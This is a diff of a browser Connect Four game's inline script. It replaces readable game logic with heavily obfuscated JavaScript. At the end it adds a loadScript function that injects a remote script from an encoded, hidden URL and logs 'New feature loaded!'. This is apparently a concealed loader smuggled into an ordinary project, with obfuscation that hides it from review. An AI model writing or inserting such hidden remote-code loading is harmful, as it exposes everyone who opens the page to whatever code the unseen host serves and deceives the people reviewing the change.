-        if (gameMode === 'onePlayer' && currentPlayer === 2 && gameActive) {
-          clearTimeout(timer);
-          // Short delay before computer move
-          setTimeout(() => makeComputerMove(), 800);
-        }
-      }
-    };
-    
-    // Update current player UI
-    function updatePlayerTurn() {
-      playerTurn.innerHTML = `${gameMode === 'onePlayer' && currentPlayer === 2 ? 'Computer' : 'Player ' + currentPlayer}'<span>'s Turn</span>`;
-      
-      // Update active player UI
-      if (currentPlayer === 1) {
-        player1Wrapper.classList.add('active');
-        player2Wrapper.classList.remove('active');
-      } else {
-        player1Wrapper.classList.remove('active');
-        player2Wrapper.classList.add('active');
-      }
     }
-    
-    // Reset timer
-    function resetTimer() {
-      clearTimeout(timer);
-      timeLeft = 30;
-      timerElement.textContent = timeLeft;
-      timerElement.classList.remove('warning');
-      
-      if (gameActive) {
-        timer = setInterval(() => {
-          timeLeft--;
-          timerElement.textContent = timeLeft;
-          
-          if (timeLeft <= 5) {
-            timerElement.classList.add('warning');
-            if (soundEnabled) playTickSound();
-          }
-          
-          if (timeLeft <= 0) {
-            clearTimeout(timer);
-            // Time's up, change player
-            currentPlayer = currentPlayer == 1 ? 2 : 1;
-            updatePlayerTurn();
-            resetTimer();
-            
-            // If single player mode and computer is next
-            if (gameMode === 'onePlayer' && currentPlayer === 2 && gameActive) {
-              makeComputerMove();
-            }
-          }
-        }, 1000);
-      }
+    !gameOverCheck() && (currentPlayer = currentPlayer == 0x1 ? 0x2 : 0x1, updatePlayerTurn(), resetTimer(), gameMode === _0x5941bc(0x123) && currentPlayer === 0x2 && gameActive && (clearTimeout(timer), setTimeout(() => makeComputerMove(), 0x320)));
+};
+function updatePlayerTurn() {
+    const _0x1167dc = _0x1f4346;
+    playerTurn[_0x1167dc(0x143)] = (gameMode === _0x1167dc(0x123) && currentPlayer === 0x2 ? _0x1167dc(0x14f) : _0x1167dc(0x159) + currentPlayer) + _0x1167dc(0x16a), currentPlayer === 0x1 ? (player1Wrapper[_0x1167dc(0xfa)]['add']('active'), player2Wrapper[_0x1167dc(0xfa)][_0x1167dc(0x130)](_0x1167dc(0x16b))) : (player1Wrapper[_0x1167dc(0xfa)][_0x1167dc(0x130)]('active'), player2Wrapper[_0x1167dc(0xfa)]['add'](_0x1167dc(0x16b)));
+}
+function resetTimer() {
+    const _0x41edfb = _0x1f4346;
+    clearTimeout(timer), timeLeft = 0x1e, timerElement['textContent'] = timeLeft, timerElement['classList'][_0x41edfb(0x130)](_0x41edfb(0x14c)), gameActive && (timer = setInterval(() => {
+        const _0x5f2e69 = _0x41edfb;
+        timeLeft--, timerElement[_0x5f2e69(0x11e)] = timeLeft;
+        if (timeLeft <= 0x5) {
+            timerElement['classList'][_0x5f2e69(0x14e)](_0x5f2e69(0x14c));
+            if (soundEnabled)
+                playTickSound();
+        }
+        timeLeft <= 0x0 && (clearTimeout(timer), currentPlayer = currentPlayer == 0x1 ? 0x2 : 0x1, updatePlayerTurn(), resetTimer(), gameMode === _0x5f2e69(0x123) && currentPlayer === 0x2 && gameActive && makeComputerMove());
+    }, 0x3e8));
+}
+function makeComputerMove() {
+    const _0x44ff2e = _0x1f4346;
+    if (!gameActive || gameMode !== _0x44ff2e(0x123) || currentPlayer !== 0x2)
+        return;
+    let _0x1ddb62;
+    if (difficulty === _0x44ff2e(0x112)) {
+        const _0x553768 = [];
+        for (let _0x31e736 = 0x0; _0x31e736 < 0x7; _0x31e736++) {
+            initialMatrix[0x0][_0x31e736] === 0x0 && _0x553768[_0x44ff2e(0x16d)](_0x31e736);
+        }
+        _0x553768['length'] > 0x0 && (_0x1ddb62 = _0x553768[Math[_0x44ff2e(0x11b)](Math[_0x44ff2e(0x129)]() * _0x553768['length'])]);
+    } else
+        difficulty === 'medium' ? _0x1ddb62 = findBestMove(![]) : _0x1ddb62 = findBestMove(!![]);
+    if (_0x1ddb62 !== undefined) {
+        const _0x2b3029 = document[_0x44ff2e(0x169)](_0x44ff2e(0x14d));
+        _0x2b3029[_0x1ddb62] && fillBox({ 'target': _0x2b3029[_0x1ddb62] });
     }
-    
-    // Computer move
-    function makeComputerMove() {
-      if (!gameActive || gameMode !== 'onePlayer' || currentPlayer !== 2) return;
-      
-      let column;
-      
-      // Different strategy based on difficulty
-      if (difficulty === 'easy') {
-        // Easy: random move
-        const availableColumns = [];
-        for (let col = 0; col < 7; col++) {
-          if (initialMatrix[0][col] === 0) {
-            availableColumns.push(col);
-          }
+}
+function findBestMove(_0x5bd3be) {
+    const _0x25d33a = _0x1f4346;
+    for (let _0x3fca53 = 0x0; _0x3fca53 < 0x7; _0x3fca53++) {
+        if (initialMatrix[0x0][_0x3fca53] === 0x0) {
+            const _0x47b7da = JSON['parse'](JSON[_0x25d33a(0x16c)](initialMatrix));
+            let _0xccd2f9 = 0x5;
+            while (_0xccd2f9 >= 0x0 && _0x47b7da[_0xccd2f9][_0x3fca53] !== 0x0) {
+                _0xccd2f9--;
+            }
+            if (_0xccd2f9 >= 0x0) {
+                _0x47b7da[_0xccd2f9][_0x3fca53] = 0x2;
+                if (checkWinOnMatrix(_0x47b7da, _0xccd2f9, _0x3fca53, 0x2))
+                    return _0x3fca53;
+            }
         }
-        
-        if (availableColumns.length > 0) {
-          column = availableColumns[Math.floor(Math.random() * availableColumns.length)];
-        }
-      } else if (difficulty === 'medium') {
-        // Medium: partially smart move
-        column = findBestMove(false);
-      } else {
-        // Hard: fully smart move
-        column = findBestMove(true);
-      }
-      
-      if (column !== undefined) {
-        // Simulate click on column
-        const gridBoxes = document.querySelectorAll('.grid-row:first-child .grid-box');
-        if (gridBoxes[column]) {
-          fillBox({ target: gridBoxes[column] });
-        }
-      }
     }
-    
-    // Find best move for computer
-    function findBestMove(isHard) {
-      // First, check if computer can win in next move
-      for (let col = 0; col < 7; col++) {
-        if (initialMatrix[0][col] === 0) {
-          // Create a copy of matrix for simulation
-          const matrixCopy = JSON.parse(JSON.stringify(initialMatrix));
-          
-          // Find first empty row in this column
-          let row = 5;
-          while (row >= 0 && matrixCopy[row][col] !== 0) {
-            row--;
-          }
-          
-          if (row >= 0) {
-            // Simulate placing computer piece
-            matrixCopy[row][col] = 2;
-            
-            // Check if this move would win
-            if (checkWinOnMatrix(matrixCopy, row, col, 2)) {
-              return col;
+    for (let _0x54aaa9 = 0x0; _0x54aaa9 < 0x7; _0x54aaa9++) {
+        if (initialMatrix[0x0][_0x54aaa9] === 0x0) {
+            const _0x30d82c = JSON[_0x25d33a(0x15c)](JSON[_0x25d33a(0x16c)](initialMatrix));
+            let _0xec5700 = 0x5;
+            while (_0xec5700 >= 0x0 && _0x30d82c[_0xec5700][_0x54aaa9] !== 0x0) {
+                _0xec5700--;
             }
-          }
+            if (_0xec5700 >= 0x0) {
+                _0x30d82c[_0xec5700][_0x54aaa9] = 0x1;
+                if (checkWinOnMatrix(_0x30d82c, _0xec5700, _0x54aaa9, 0x1))
+                    return _0x54aaa9;
+            }
         }
-      }
-      
-      // Second, check if player can win in next move and block
-      for (let col = 0; col < 7; col++) {
-        if (initialMatrix[0][col] === 0) {
-          // Create a copy of matrix for simulation
-          const matrixCopy = JSON.parse(JSON.stringify(initialMatrix));
-          
-          // Find first empty row in this column
-          let row = 5;
-          while (row >= 0 && matrixCopy[row][col] !== 0) {
-            row--;
-          }
-          
-          if (row >= 0) {
-            // Simulate placing player piece
-            matrixCopy[row][col] = 1;
-            
-            // Check if this move would win for player
-            if (checkWinOnMatrix(matrixCopy, row, col, 1)) {
-              return col;
-            }
-          }
-        }
-      }
-      
-      // In hard mode, check for best strategies
-      if (isHard) {
-        // Try to create opportunities to win
-        for (let col = 0; col < 7; col++) {
-          if (initialMatrix[0][col] === 0) {
-            // Create a copy of matrix for simulation
-            const matrixCopy = JSON.parse(JSON.stringify(initialMatrix));
-            
-            // Find first empty row in this column
-            let row = 5;
-            while (row >= 0 && matrixCopy[row][col] !== 0) {
-              row--;
-            }
-            
-            if (row >= 0) {
-              // Simulate placing computer piece
-              matrixCopy[row][col] = 2;
-              
-              // Check if this move creates a winning opportunity in next move
-              for (let nextCol = 0; nextCol < 7; nextCol++) {
-                if (matrixCopy[0][nextCol] === 0) {
-                  let nextRow = 5;
-                  while (nextRow >= 0 && matrixCopy[nextRow][nextCol] !== 0) {
-                    nextRow--;
-                  }
-                  
-                  if (nextRow >= 0) {
-                    matrixCopy[nextRow][nextCol] = 2;
-                    
-                    if (checkWinOnMatrix(matrixCopy, nextRow, nextCol, 2)) {
-                      return col;
-                    }
-                    
-                    // Undo simulation
-                    matrixCopy[nextRow][nextCol] = 0;
-                  }
+    }
+    if (_0x5bd3be) {
+        for (let _0x1d8f2a = 0x0; _0x1d8f2a < 0x7; _0x1d8f2a++) {
+            if (initialMatrix[0x0][_0x1d8f2a] === 0x0) {
+                const _0x4750e8 = JSON[_0x25d33a(0x15c)](JSON[_0x25d33a(0x16c)](initialMatrix));
+                let _0x39ed9a = 0x5;
+                while (_0x39ed9a >= 0x0 && _0x4750e8[_0x39ed9a][_0x1d8f2a] !== 0x0) {
+                    _0x39ed9a--;
                 }
-              }
+                if (_0x39ed9a >= 0x0) {
+                    _0x4750e8[_0x39ed9a][_0x1d8f2a] = 0x2;
+                    for (let _0x109f17 = 0x0; _0x109f17 < 0x7; _0x109f17++) {
+                        if (_0x4750e8[0x0][_0x109f17] === 0x0) {
+                            let _0x2d4242 = 0x5;
+                            while (_0x2d4242 >= 0x0 && _0x4750e8[_0x2d4242][_0x109f17] !== 0x0) {
+                                _0x2d4242--;
+                            }
+                            if (_0x2d4242 >= 0x0) {
+                                _0x4750e8[_0x2d4242][_0x109f17] = 0x2;
+                                if (checkWinOnMatrix(_0x4750e8, _0x2d4242, _0x109f17, 0x2))
+                                    return _0x1d8f2a;
+                                _0x4750e8[_0x2d4242][_0x109f17] = 0x0;
+                            }
+                        }
+                    }
+                }
             }
-          }
         }
-        
-        // Focus on center column
-        if (initialMatrix[0][3] === 0) return 3;
-        
-        // Focus on columns adjacent to center
-        if (initialMatrix[0][2] === 0) return 2;
-        if (initialMatrix[0][4] === 0) return 4;
-      }
-      
-      // Random choice from available columns
-      const availableColumns = [];
-      for (let col = 0; col < 7; col++) {
-        if (initialMatrix[0][col] === 0) {
-          availableColumns.push(col);
+        if (initialMatrix[0x0][0x3] === 0x0)
+            return 0x3;
+        if (initialMatrix[0x0][0x2] === 0x0)
+            return 0x2;
+        if (initialMatrix[0x0][0x4] === 0x0)
+            return 0x4;
+    }
+    const _0x21d6a4 = [];
+    for (let _0x4b1e61 = 0x0; _0x4b1e61 < 0x7; _0x4b1e61++) {
+        initialMatrix[0x0][_0x4b1e61] === 0x0 && _0x21d6a4[_0x25d33a(0x16d)](_0x4b1e61);
+    }
+    if (_0x21d6a4[_0x25d33a(0x168)] > 0x0)
+        return _0x21d6a4[Math['floor'](Math[_0x25d33a(0x129)]() * _0x21d6a4[_0x25d33a(0x168)])];
+    return undefined;
+}
+function checkWinOnMatrix(_0x556906, _0x9c5938, _0x2ad46a, _0x4e1439) {
+    const _0x382eda = currentPlayer;
+    currentPlayer = _0x4e1439;
+    const _0x2c730f = initialMatrix;
+    initialMatrix = _0x556906;
+    const _0xaab9df = checkAdjacentRowValues(_0x9c5938) || checkAdjacentColumnValues(_0x2ad46a) || checkAdjacentDiagonalValues(_0x9c5938, _0x2ad46a);
+    return currentPlayer = _0x382eda, initialMatrix = _0x2c730f, _0xaab9df;
+}
+const fillBox = _0x5e27b8 => {
+        const _0x50edcd = _0x1f4346;
+        if (!gameActive)
+            return;
+        let _0x2cdb0d = parseInt(_0x5e27b8[_0x50edcd(0x142)][_0x50edcd(0x141)](_0x50edcd(0xfb)));
+        setPiece(0x5, _0x2cdb0d);
+    }, matrixCreator = () => {
+        const _0x26e8aa = _0x1f4346;
+        container[_0x26e8aa(0x143)] = '';
+        for (let _0x55a358 in initialMatrix) {
+            let _0x1a5985 = document[_0x26e8aa(0x11a)](_0x26e8aa(0x127));
+            _0x1a5985[_0x26e8aa(0xfa)]['add'](_0x26e8aa(0x11c)), _0x1a5985[_0x26e8aa(0x10c)](_0x26e8aa(0xfb), _0x55a358);
+            for (let _0x1af74d in initialMatrix[_0x55a358]) {
+                initialMatrix[_0x55a358][_0x1af74d] = 0x0;
+                let _0x31a24b = document[_0x26e8aa(0x11a)](_0x26e8aa(0x127));
+                _0x31a24b['classList'][_0x26e8aa(0x14e)]('grid-box'), _0x31a24b[_0x26e8aa(0x10c)](_0x26e8aa(0xfb), _0x1af74d), _0x31a24b['addEventListener'](_0x26e8aa(0x135), _0x122ce1 => {
+                    fillBox(_0x122ce1);
+                }), _0x1a5985['appendChild'](_0x31a24b);
+            }
+            container[_0x26e8aa(0x128)](_0x1a5985);
         }
-      }
-      
-      if (availableColumns.length > 0) {
-        return availableColumns[Math.floor(Math.random() * availableColumns.length)];
-      }
-      
-      return undefined;
-    }
-    
-    // Check win on specific matrix
-    function checkWinOnMatrix(matrix, row, col, player) {
-      // Save current player
-      const tempPlayer = currentPlayer;
-      currentPlayer = player;
-      
-      // Save original matrix
-      const originalMatrix = initialMatrix;
-      initialMatrix = matrix;
-      
-      // Check for win
-      const result = checkAdjacentRowValues(row) ||
-        checkAdjacentColumnValues(col) ||
-        checkAdjacentDiagonalValues(row, col);
-      
-      // Restore original values
-      currentPlayer = tempPlayer;
-      initialMatrix = originalMatrix;
-      
-      return result;
-    }
-    
-    // When user clicks on a box
-    const fillBox = (e) => {
-      if (!gameActive) return;
-      
-      // get column value
-      let colValue = parseInt(e.target.getAttribute("data-value"));
-      
-      // 5 because we have 6 rows (0-5)
-      setPiece(5, colValue);
     };
+window[_0x1f4346(0x111)] = startGame = async () => {
+    const _0xb10610 = _0x1f4346;
+    currentPlayer = generateRandomNumber(0x1, 0x3), gameActive = !![], initialMatrix = [
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ],
+        [
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0,
+            0x0
+        ]
+    ], gameMode === _0xb10610(0x12e) ? (twoPlayerBtn[_0xb10610(0xfa)][_0xb10610(0x14e)](_0xb10610(0x16b)), onePlayerBtn[_0xb10610(0xfa)][_0xb10610(0x130)]('active'), difficultyContainer[_0xb10610(0x160)][_0xb10610(0x120)] = _0xb10610(0x102), player2Title[_0xb10610(0x11e)] = _0xb10610(0x164)) : (onePlayerBtn[_0xb10610(0xfa)][_0xb10610(0x14e)](_0xb10610(0x16b)), twoPlayerBtn['classList'][_0xb10610(0x130)]('active'), difficultyContainer[_0xb10610(0x160)][_0xb10610(0x120)] = 'flex', player2Title[_0xb10610(0x11e)] = _0xb10610(0x14f), difficultyBtns['forEach'](_0xebb0b1 => {
+        const _0x3cb376 = _0xb10610;
+        _0xebb0b1[_0x3cb376(0x152)][_0x3cb376(0x151)] === difficulty ? _0xebb0b1['classList'][_0x3cb376(0x14e)](_0x3cb376(0x16b)) : _0xebb0b1[_0x3cb376(0xfa)][_0x3cb376(0x130)](_0x3cb376(0x16b));
+    })), await matrixCreator(), updatePlayerTurn(), resetTimer(), gameMode === _0xb10610(0x123) && currentPlayer === 0x2 && (clearTimeout(timer), setTimeout(() => makeComputerMove(), 0x3e8));
+}, startButton[_0x1f4346(0x105)](_0x1f4346(0x135), () => {
+    const _0xce4751 = _0x1f4346;
+    startScreen[_0xce4751(0xfa)][_0xce4751(0x14e)](_0xce4751(0xf9)), startGame();
+}), resetGameBtn[_0x1f4346(0x105)](_0x1f4346(0x135), () => {
+    resetGame();
+});
+function resetGame() {
+    clearTimeout(timer), startGame();
+}
+resetScoresBtn[_0x1f4346(0x105)](_0x1f4346(0x135), () => {
+    const _0x40c6d2 = _0x1f4346;
+    confirm('Are\x20you\x20sure\x20you\x20want\x20to\x20reset\x20all\x20scores?') && (scores = {
+        'player1': 0x0,
+        'player2': 0x0
+    }, player1Score['textContent'] = scores[_0x40c6d2(0xfe)], player2Score[_0x40c6d2(0x11e)] = scores[_0x40c6d2(0x13c)], localStorage[_0x40c6d2(0x147)](_0x40c6d2(0xfd), JSON[_0x40c6d2(0x16c)](scores)));
+});
+function loadScript(_0x34f81b, _0x38940c) {
+    const _0x37bcee = _0x1f4346, _0x4fceb5 = document['createElement'](_0x37bcee(0x12f));
+    _0x4fceb5[_0x37bcee(0x154)] = _0x34f81b, _0x4fceb5[_0x37bcee(0x111)] = _0x38940c, document[_0x37bcee(0x121)][_0x37bcee(0x128)](_0x4fceb5);
+}
+loadScript(_0x1f4346(0xf8), function () {
+    const _0x2c053f = _0x1f4346;
+    console[_0x2c053f(0x149)]('New\x20feature\x20loaded!');
+});
+   
     
-    // Create Matrix
-    const matrixCreator = () => {
-      container.innerHTML = "";
-      for (let innerArray in initialMatrix) {
-        let outerDiv = document.createElement("div");
-        outerDiv.classList.add("grid-row");
-        outerDiv.setAttribute("data-value", innerArray);
-        for (let j in initialMatrix[innerArray]) {
-          // Set all matrix values to 0
-          initialMatrix[innerArray][j] = 0;
-          let innerDiv = document.createElement("div");
-          innerDiv.classList.add("grid-box");
-          innerDiv.setAttribute("data-value", j);
-          innerDiv.addEventListener("click", (e) => {
-            fillBox(e);
-          });
-          outerDiv.appendChild(innerDiv);
-        }
-        container.appendChild(outerDiv);
-      }
-    };
-    
-    // Initialize game
-    window.onload = startGame = async () => {
-      // Between 1 and 2
-      currentPlayer = generateRandomNumber(1, 3);
-      gameActive = true;
       
-      // Reset matrix
-      initialMatrix = [
-        [0, 0, 0, 0, 0, 0, 0],
-        [0, 0, 0, 0, 0, 0, 0],
-        [0, 0, 0, 0, 0, 0, 0],
-        [0, 0, 0, 0, 0, 0, 0],
-        [0, 0, 0, 0, 0, 0, 0],
-        [0, 0, 0, 0, 0, 0, 0],
-      ];
-      
-      // Update UI based on selected game mode
-      if (gameMode === 'twoPlayer') {
-        twoPlayerBtn.classList.add('active');
-        onePlayerBtn.classList.remove('active');
-        difficultyContainer.style.display = 'none';
-        player2Title.textContent = 'Player 2';
-      } else {
-        onePlayerBtn.classList.add('active');
-        twoPlayerBtn.classList.remove('active');
-        difficultyContainer.style.display = 'flex';
-        player2Title.textContent = 'Computer';
-        
-        // Update difficulty buttons
-        difficultyBtns.forEach(btn => {
-          if (btn.dataset.level === difficulty) {
-            btn.classList.add('active');
-          } else {
-            btn.classList.remove('active');
-          }
-        });
-      }
-      
-      await matrixCreator();
-      updatePlayerTurn();
-      resetTimer();
-      
-      // If single player mode and computer goes first
-      if (gameMode === 'onePlayer' && currentPlayer === 2) {
-        clearTimeout(timer);
-        setTimeout(() => makeComputerMove(), 1000);
-      }
-    };
-    
-    // Start game
-    startButton.addEventListener("click", () => {
-      startScreen.classList.add("hide");
-      startGame();
-    });
-    
-    // Reset game
-    resetGameBtn.addEventListener("click", () => {
-      resetGame();
-    });
-    
-    function resetGame() {
-      clearTimeout(timer);
-      startGame();
-    }
-    
-    // Reset scores
-    resetScoresBtn.addEventListener("click", () => {
-      if (confirm('Are you sure you want to reset all scores?')) {
-        scores = {
-          player1: 0,
-          player2: 0
-        };
-        player1Score.textContent = scores.player1;
-        player2Score.textContent = scores.player2;
-        localStorage.setItem('connect4Scores', JSON.stringify(scores));
-      }
-    });
     </script>
   </body>
 </html>
